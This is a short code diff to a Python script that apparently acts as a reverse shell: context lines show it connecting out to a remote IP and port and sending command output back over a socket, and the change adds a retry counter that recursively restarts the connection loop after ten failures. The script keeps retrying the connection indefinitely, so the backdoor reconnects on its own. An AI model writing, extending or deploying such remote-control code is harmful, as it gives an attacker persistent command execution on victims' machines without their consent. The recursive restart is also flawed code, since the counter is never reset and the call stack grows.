@@ -304,6 +304,7 @@ def connect(ip_address, port):
             s.send( CMD.stderr.read()  ) 
 
 def main ():
+    count = 0
     ip_address, port = getIpAddress()
     while True:
         try:
@@ -312,6 +313,9 @@ def main ():
         except:
             sleep_for = random.randrange(1, 10)
             time.sleep(sleep_for)
+            count += 1
+            if count == 10:
+                main()
             pass
 
 if __name__ == "__main__":
